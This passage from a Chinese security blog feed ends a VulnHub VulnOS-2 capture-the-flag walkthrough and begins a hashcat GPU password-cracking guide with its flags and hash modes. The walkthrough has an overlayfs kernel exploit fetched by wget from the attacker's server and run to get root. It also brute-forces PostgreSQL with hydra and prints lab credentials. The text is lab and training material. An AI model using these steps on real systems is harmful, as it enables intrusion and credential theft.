<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span></span><br><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># ls</span></span><br><span class="line">37292.c</span><br><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...                                                                                      </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found                                                   </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -                                                     </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.104 - - [19/Apr/2020 23:29:54] <span class="string">&quot;GET /37292.c HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>受害机器运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/37292.c</span><br><span class="line">--2020-04-20 05:29:53--  http://192.168.56.102:8000/37292.c</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5119 (5.0K) [text/plain]</span><br><span class="line">Saving to: ‘37292.c’</span><br><span class="line"></span><br><span class="line">100%[===================================================================================&gt;] 5,119       --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-04-20 05:29:53 (895 MB/s) - ‘37292.c’ saved [5119/5119]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">37292.c</span><br><span class="line">$ chmod 777 *</span><br><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .</span><br><span class="line">drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 37292.c</span><br></pre></td></tr></table></figure>

<p>编译并执行程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod 777 *</span><br><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .</span><br><span class="line">drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 37292.c</span><br><span class="line">$ gcc 37292.c -o shell</span><br><span class="line">$ ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwx  2 root   root    4096 Apr 20 05:30 .</span><br><span class="line">drwxr-xr-x 21 root   root    4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin  5119 Apr 20 05:28 37292.c</span><br><span class="line">-rwxrwxr-x  1 webmin webmin 12193 Apr 20 05:30 shell</span><br><span class="line">$ ./shell </span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(webmin)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">Hello and welcome.</span><br><span class="line">You successfully compromised the company <span class="string">&quot;JABC&quot;</span> and the server completely !!</span><br><span class="line">Congratulations !!!</span><br><span class="line">Hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you think of A.I.?</span><br></pre></td></tr></table></figure>

<p>成功得到root权限并获取了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub269.jpg"></li>
</ul>
<h3 id="其它getshell尝试"><a href="#其它getshell尝试" class="headerlink" title="其它getshell尝试"></a>其它getshell尝试</h3><p>使用之前的webmin账号密码登录web界面后，还可以添加上传文件的类型，从而上传php脚本文件</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub270.jpg"></li>
</ul>
<p>成功上传php脚本文件后，访问它发现脚本文件并不能被解析</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub271.jpg"></li>
</ul>
<h3 id="其它获取root权限的方法"><a href="#其它获取root权限的方法" class="headerlink" title="其它获取root权限的方法"></a>其它获取root权限的方法</h3><p>/home/webmin目录下有一个post.tar.gz文件</p>
<p>解压后似乎是“hydra”的复制品。这是为什么呢?<br>执行“netstat -antp”命令，会看到只有mysql(port3306)和postgresql(5432)数据库服务在本地运行，仅在127.0.0.1上运行。</p>
<p>有一个hydra的本地副本、一个密码bruteforcer和一个仅在本地运行的服务。<br>首先输入目录“post”，通过输入命令“<br>./在“make”后面加上“configure”。没有义务去做“安装”，取决于你。<br>make就可以了。<br>键入./hydra——帮助检查是否一切正常。</p>
<p>首先在端口5432上强制本地postgres数据库。<br>为了简单，使用metasploit-framework提供的字典列表“postgres_default_pass.txt”。<br>只需要在目标机器上获取字典列表。<br>本地攻击机器上启动apache webserver，将字典列表复制到公共html文件夹中，然后作为目标机器上的“webmin”用户进入shell。</p>
<p>然后启动hydra爆破</p>
<p>成功!现在知道postgresql数据库的用户凭证是postgres:posgtres。<br>仍然以“webmin”的身份登录到postgresql数据库，四处浏览。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\c system</span><br><span class="line"></span><br><span class="line">\dt</span><br><span class="line"></span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p>得到了username</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin</span><br></pre></td></tr></table></figure>

<p>password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c4nuh4ckm3tw1c3</span><br></pre></td></tr></table></figure>

<p>成功登录了ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vulnosadmin@192.168.56.104</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">vulnosadmin@192.168.56.104<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Mon Apr 20 05:11:47 CEST 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:           86</span></span><br><span class="line"><span class="string">  Usage of /:   5.8% of 29.91GB   Users logged in:     0</span></span><br><span class="line"><span class="string">  Memory usage: 16%               IP address for eth0: 192.168.56.104</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at:</span></span><br><span class="line"><span class="string">    https://landscape.canonical.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed May  4 19:35:16 2016 from 192.168.56.101</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOSv2:~$ id</span></span><br><span class="line"><span class="string">uid=1000(vulnosadmin) gid=1000(vulnosadmin) groups=1000(vulnosadmin),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOSv2:~$ whoami</span></span><br><span class="line"><span class="string">vulnosadmin</span></span><br></pre></td></tr></table></figure>

<p>在用户“vulnosadmin”的主目录中发现了一个奇怪的文件。</p>
<p>查看它，似乎是一个blender3D文件。Blender 3D是一款三维建模和动画制作软件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin@VulnOSv2:~$ ls</span><br><span class="line">r00t.blend</span><br></pre></td></tr></table></figure>

<p>如果在blender中打开文件，会看到一个3D立方体。以实模式显示。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub272.jpg"></li>
</ul>
<p>都得到了一个字符串，尝试用作root密码登录ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ab12fg//drg</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin@VulnOSv2:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># cd /root</span></span><br><span class="line">root@VulnOSv2:~<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@VulnOSv2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">Hello and welcome.</span><br><span class="line">You successfully compromised the company <span class="string">&quot;JABC&quot;</span> and the server completely !!</span><br><span class="line">Congratulations !!!</span><br><span class="line">Hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you think of A.I.?</span><br></pre></td></tr></table></figure>

<p>成功登录并得到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub273.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>OpenDocMan 1.2.7 cms sql注入（CVE-2014-1945）</li>
<li>Linux内核3.13.0 &lt; 3.19(Ubuntu 12.04/14.04/14.10/15.04)-“overlayfs”本地提权</li>
<li>hydra爆破postgresql数据库用户名和密码</li>
<li>blender软件查看.blender后缀3d建模文件以寻找root用户ssh密码</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>windows下hashcat利用GPU显卡性能破解密码</title>
    <url>/2019/10/22/windows-hashcat-insatll/</url>
    <content><![CDATA[<p><font color="green"><strong><em>由于一般密码破解工具的破解速度实在是太慢，而且支持的密码破解协议也不多，暴力破解的话，有的密码1年时间也破不出来，用字典跑的话必须要明文密码在字典里才行，而且密码字典太大的话，也很浪费时间，跑不出来也是很常见的事情，下面推荐一款世界上破解密码速度最快的工具，hashcat，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhc2hjYXQvaGFzaGNhdA==">hashcat github地址<i class="fa fa-external-link-alt"></i></span>,选择最新版的下载即可。</em></strong></font></p>
<h2 id="hashcat支持多种计算核心："><a href="#hashcat支持多种计算核心：" class="headerlink" title="hashcat支持多种计算核心："></a>hashcat支持多种计算核心：</h2><p>GPU<br>CPU<br>APU<br>DSP<br>FPGA<br>Coprocessor</p>
<a id="more"></a>

<h2 id="GPU的驱动要求"><a href="#GPU的驱动要求" class="headerlink" title="GPU的驱动要求"></a>GPU的驱动要求</h2><p>AMD GPUs on Linux require “RadeonOpenCompute (ROCm)” Software Platform (1.6.180 or later)<br>AMD GPUs on Windows require “AMD Radeon Software Crimson Edition” (15.12 or later)<br>Intel CPUs require “OpenCL Runtime for Intel Core and Intel Xeon Processors” (16.1.1 or later)<br>Intel GPUs on Linux require “OpenCL 2.0 GPU Driver Package for Linux” (2.0 or later)<br>Intel GPUs on Windows require “OpenCL Driver for Intel Iris and Intel HD Graphics”<br>NVIDIA GPUs require “NVIDIA Driver” (367.x or later)</p>
<h3 id="第一步：下载官方NVIDA驱动程序"><a href="#第一步：下载官方NVIDA驱动程序" class="headerlink" title="第一步：下载官方NVIDA驱动程序"></a>第一步：下载官方NVIDA驱动程序</h3><p>到<span class="exturl" data-url="aHR0cHM6Ly93d3cubnZpZGlhLmNuL0Rvd25sb2FkL2luZGV4LmFzcHg/bGFuZz1jbg==">NVIDA官网<i class="fa fa-external-link-alt"></i></span>下载与自己电脑显卡型号相对应的显卡驱动程序如图所示，然后根据提示一步步安装即可。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat1.jpg" alt="hashcat"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat2.jpg" alt="hashcat"></p>
<p>安装完成后，重启电脑即可。</p>
<p><font color="red">(NAVIDA的显卡只需要安装官方驱动即可，已经内含HASHCAT破解密码所需的GPU运算工具。记得使用上图官方下载的显卡驱动，不要使用windows自带的显卡驱动。)</font></p>
<h3 id="第二步：测试hashcat是否能利用gpu运算速度来破解密码"><a href="#第二步：测试hashcat是否能利用gpu运算速度来破解密码" class="headerlink" title="第二步：测试hashcat是否能利用gpu运算速度来破解密码"></a>第二步：测试hashcat是否能利用gpu运算速度来破解密码</h3><p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -b</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat3.jpg" alt="hashcat"><br>基准测试hashcat破解各种密码散列的速度。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -I</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat4.jpg" alt="hashcat"><br>检查设置如果已正确安装了GPU能够看到它并会列出其属性和使用的驱动程序信息。</p>
<p>破解examples:<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat5.jpg" alt="hashcat"></p>
<h3 id="第三步：hashcat详细命令及使用"><a href="#第三步：hashcat详细命令及使用" class="headerlink" title="第三步：hashcat详细命令及使用"></a>第三步：hashcat详细命令及使用</h3><h2 id="普通"><a href="#普通" class="headerlink" title="普通"></a>普通</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-m, —<span class="built_in">hash</span>-type=NUM           哈希类别，其NUM值参考其帮助信息下面的哈希类别值，其值为数字。如果不指定m值则默认指md5，例如-m 1800是sha512 Linux加密。</span><br><span class="line"></span><br><span class="line">-a, –attack-mode=NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line"></span><br><span class="line">-V, —version                            版本信息</span><br><span class="line"></span><br><span class="line">-h, –<span class="built_in">help</span>                                   帮助信息。</span><br><span class="line"></span><br><span class="line">–quiet                                       安静的模式, 抑制输出</span><br></pre></td></tr></table></figure>
<h2 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-b, –benchmark                       测试计算机破解速度和显示硬件相关信息</span><br></pre></td></tr></table></figure>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">–hex-salt                         salt值是用十六进制给出的</span><br><span class="line"></span><br><span class="line">–hex-charset                  设定字符集是十六进制给出</span><br><span class="line"></span><br><span class="line">–runtime=NUM              运行数秒（NUM值）后的中止会话</span><br><span class="line"></span><br><span class="line">–status                            启用状态屏幕的自动更新</span><br><span class="line"></span><br><span class="line">–status-timer=NUM       状态屏幕更新秒值</span><br><span class="line"></span><br><span class="line">–status-automat             以机器可读的格式显示状态视图</span><br><span class="line"></span><br><span class="line">–session                         后跟会话名称，主要用于中止任务后的恢复破解。</span><br></pre></td></tr></table></figure>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-o,  –outfile=FILE                   定义哈希文件恢复输出文件</span><br><span class="line"></span><br><span class="line">–outfile-format=NUM            定义哈希文件输出格式，见下面的参考资料</span><br><span class="line"></span><br><span class="line">–outfile-autohex-disable       禁止使用十六进制输出明文</span><br><span class="line"></span><br><span class="line">-p,  –separator=CHAR         为哈希列表/输出文件定义分隔符字符</span><br><span class="line"></span><br><span class="line">–show                                     仅仅显示已经破解的密码</span><br><span class="line"></span><br><span class="line">–left                                         仅仅显示未破解的密码</span><br><span class="line"></span><br><span class="line">–username                            忽略<span class="built_in">hash</span>表中的用户名，对linux文件直接进行破解，不需要进行整理。</span><br><span class="line"></span><br><span class="line">–remove                                移除破解成功的<span class="built_in">hash</span>，当<span class="built_in">hash</span>是从文本中读取时有用，避免自己手工移除已经破解的<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">–stdout                                  控制台模式</span><br><span class="line"></span><br><span class="line">–potfile-disable                    不写入pot文件</span><br><span class="line"></span><br><span class="line">–debug-mode=NUM           定义调试模式（仅通过使用规则进行混合），参见下面的参考资料</span><br><span class="line"></span><br><span class="line">–debug-file=FILE                调试规则的输出文件（请参阅调试模式）</span><br><span class="line"></span><br><span class="line">-e, –salt-file=FILE                定义加盐文件列表</span><br><span class="line"></span><br><span class="line">–logfile-disable                    禁止logfile</span><br></pre></td></tr></table></figure>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c, –segment-size=NUM       字典文件缓存大小（M）</span><br><span class="line"></span><br><span class="line">-n, –threads=NUM                 线程数</span><br><span class="line"></span><br><span class="line">-s,  –words-skip=NUM          跳过单词数</span><br><span class="line"></span><br><span class="line">-l, –words-limit=NUM            限制单词数(分布式)</span><br></pre></td></tr></table></figure>
<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r, –rules-file=FILE             使用规则文件: -r 1.rule，</span><br><span class="line"></span><br><span class="line">-g, –generate-rules=NUM       随机生成规则</span><br><span class="line"></span><br><span class="line">–generate-rules-func-min= 每个随机规则最小值</span><br><span class="line"></span><br><span class="line">–generate-rules-func-max=每个随机规则最大值</span><br><span class="line"></span><br><span class="line">–generate-rules-seed=NUM  强制RNG种子数</span><br></pre></td></tr></table></figure>
<h2 id="自定义字符集"><a href="#自定义字符集" class="headerlink" title="自定义字符集"></a>自定义字符集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-1,  –custom-charset1=CS  用户定义的字符集</span><br><span class="line"></span><br><span class="line">-2, –custom-charset2=CS  例如:</span><br><span class="line"></span><br><span class="line">-3, –custom-charset3=CS –custom-charset1=?dabcdef : 设置?1 为0123456789abcdef</span><br><span class="line"></span><br><span class="line">-4, –custom-charset4=CS   -2mycharset.hcchr : 设置 ?2 包含在mycharset.hcchr</span><br></pre></td></tr></table></figure>
<h2 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">–toggle-min=NUM              在字典中字母的最小值</span><br><span class="line"></span><br><span class="line">–toggle-max=NUM              在字典中字母的最大值</span><br><span class="line"></span><br><span class="line">–increment                   使用增强模式</span><br><span class="line"></span><br><span class="line">–increment-min=NUM          增强模式开始值</span><br><span class="line"></span><br><span class="line">–increment-max=NUM          增强模式结束值</span><br><span class="line"></span><br><span class="line">–perm-min=NUM                过滤比NUM数小的单词</span><br><span class="line"></span><br><span class="line">–perm-max=NUM               过滤比NUM数大的单词</span><br><span class="line"></span><br><span class="line">-t, –table-file=FILE             表文件</span><br><span class="line"></span><br><span class="line">    –table-min=NUM               在字典中的最小字符值</span><br><span class="line"></span><br><span class="line">    –table-max=NUM               在字典中的最大字符值</span><br><span class="line"></span><br><span class="line">–pw-min=NUM                  如果长度大于NUM，则打印候选字符</span><br><span class="line"></span><br><span class="line">–pw-max=NUM                 如果长度小于NUM，则打印候选字符</span><br><span class="line"></span><br><span class="line">–elem-cnt-min=NUM            每个链的最小元素数</span><br><span class="line"></span><br><span class="line">–elem-cnt-max=NUM            每个链的最大元素数</span><br><span class="line"></span><br><span class="line">–wl-dist-len                从字典表中计算输出长度分布</span><br><span class="line"></span><br><span class="line">–wl-max=NUM             从字典文件中加载NUM个单词，设置0禁止加载。</span><br><span class="line"></span><br><span class="line">–<span class="keyword">case</span>-permute             在字典中对每一个单词进行反转</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 = <span class="built_in">hash</span>[:salt]</span><br><span class="line"></span><br><span class="line">2 = plain 明文</span><br><span class="line"></span><br><span class="line">3 = <span class="built_in">hash</span>[:salt]:plain</span><br><span class="line"></span><br><span class="line">4 = hex_plain</span><br><span class="line"></span><br><span class="line">5 = <span class="built_in">hash</span>[:salt]:hex_plain</span><br><span class="line"></span><br><span class="line">6 = plain:hex_plain</span><br><span class="line"></span><br><span class="line">7 = <span class="built_in">hash</span>[:salt]:plain:hex_plain</span><br><span class="line"></span><br><span class="line">8 = crackpos</span><br><span class="line"></span><br><span class="line">9 = <span class="built_in">hash</span>[:salt]:crackpos</span><br><span class="line"></span><br><span class="line">10 = plain:crackpos</span><br><span class="line"></span><br><span class="line">11 = <span class="built_in">hash</span>[:salt]:plain:crackpos</span><br><span class="line"></span><br><span class="line">12 = hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">13 = <span class="built_in">hash</span>[:salt]:hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">14 = plain:hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">15 = <span class="built_in">hash</span>[:salt]:plain:hex_plain:crackpos</span><br></pre></td></tr></table></figure>
<h2 id="调试模式输出文件-for-hybrid-mode-only-by-using-rules"><a href="#调试模式输出文件-for-hybrid-mode-only-by-using-rules" class="headerlink" title="调试模式输出文件 (for hybrid mode only, by using rules):"></a>调试模式输出文件 (for hybrid mode only, by using rules):</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 = save finding rule </span><br><span class="line"></span><br><span class="line">2 = save original word</span><br><span class="line"></span><br><span class="line">3 = save original word and finding rule</span><br><span class="line"></span><br><span class="line">4 = save original word, finding rule andmodified plain</span><br></pre></td></tr></table></figure>
<h2 id="内置的字符集"><a href="#内置的字符集" class="headerlink" title="内置的字符集:"></a>内置的字符集:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?l = abcdefghijklmnopqrstuvwxyz 代表小写字母</span><br><span class="line"></span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ 代表大写字母</span><br><span class="line"></span><br><span class="line">?d = 0123456789 代表数字</span><br><span class="line"></span><br><span class="line">?s = !”<span class="comment">#$%&amp;’()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~  代表特殊字符</span></span><br><span class="line"></span><br><span class="line">?a = ?l?u?d?s 大小写数字及特殊字符的组合</span><br><span class="line"></span><br><span class="line">?b = 0×00 – 0xff</span><br></pre></td></tr></table></figure>

<h2 id="攻击模式-1"><a href="#攻击模式-1" class="headerlink" title="攻击模式"></a>攻击模式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 = Straight （字典破解）</span><br><span class="line"></span><br><span class="line">1 = Combination （组合破解）</span><br><span class="line"></span><br><span class="line">2 = Toggle-Case （大小写转换）</span><br><span class="line"></span><br><span class="line">3 = Brute-force（掩码暴力破解）</span><br><span class="line"></span><br><span class="line">4 = Permutation（序列破解）</span><br><span class="line"></span><br><span class="line">5 = Table-Lookup（查表破解）</span><br><span class="line"></span><br><span class="line">6 = Hybrid dict + mask 字典加掩码破解</span><br><span class="line"></span><br><span class="line">7 = Hybrid mask + dict 掩码+字典破解</span><br><span class="line"></span><br><span class="line">8 = Prince（王子破解）</span><br></pre></td></tr></table></figure>

<h2 id="哈希类型"><a href="#哈希类型" class="headerlink" title="哈希类型"></a>哈希类型</h2><p>有关哈希具体值示例可以参考<span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC93aWtpL2Rva3UucGhwP2lkPWV4YW1wbGVfaGFzaGVz">网址<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0 = MD5</span><br><span class="line"></span><br><span class="line">  10 = md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  20 = md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  30 = md5(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  40 = md5(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  50 = HMAC-MD5 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  60 = HMAC-MD5 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  100 = SHA1</span><br><span class="line"></span><br><span class="line">  110 = sha1(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  120 = sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  130 = sha1(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  140 = sha1(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  150 = HMAC-SHA1 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  160 = HMAC-SHA1 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  200 = MySQL323</span><br><span class="line"></span><br><span class="line">  300 = MySQL4.1/MySQL5</span><br><span class="line"></span><br><span class="line">  400 = phpass, MD5(WordPress), MD5(phpBB3),MD5(Joomla)</span><br><span class="line"></span><br><span class="line">  500 = md5crypt, MD5(Unix), FreeBSD MD5,Cisco-IOS MD5</span><br><span class="line"></span><br><span class="line">  900 = MD4</span><br><span class="line"></span><br><span class="line">  1000 = NTLM</span><br><span class="line"></span><br><span class="line">  1100 = Domain Cached Credentials (DCC), MSCache</span><br><span class="line"></span><br><span class="line">  1400 = SHA256</span><br><span class="line"></span><br><span class="line">  1410 = sha256(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1420 = sha256(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1430 = sha256(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1431 = base64(sha256(unicode(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  1440 = sha256(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  1450 = HMAC-SHA256 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1460 = HMAC-SHA256 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1600 = md5apr1, MD5(APR), Apache MD5</span><br><span class="line"></span><br><span class="line">  1700 = SHA512</span><br><span class="line"></span><br><span class="line">  1710 = sha512(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1720 = sha512(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1730 = sha512(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1740 = sha512(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  1750 = HMAC-SHA512 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1760 = HMAC-SHA512 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1800 = SHA-512(Unix)</span><br><span class="line"></span><br><span class="line">  2400 = Cisco-PIX MD5</span><br><span class="line"></span><br><span class="line">  2410 = Cisco-ASA MD5</span><br><span class="line"></span><br><span class="line">  2500 = WPA/WPA2</span><br><span class="line"></span><br><span class="line">  2600 = Double MD5</span><br><span class="line"></span><br><span class="line">  3200 = bcrypt, Blowfish(OpenBSD)</span><br><span class="line"></span><br><span class="line">  3300 = MD5(Sun)</span><br><span class="line"></span><br><span class="line">  3500 = md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  3610 = md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  3710 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  3720 = md5(<span class="variable">$pass</span>.md5(<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  3800 = md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span 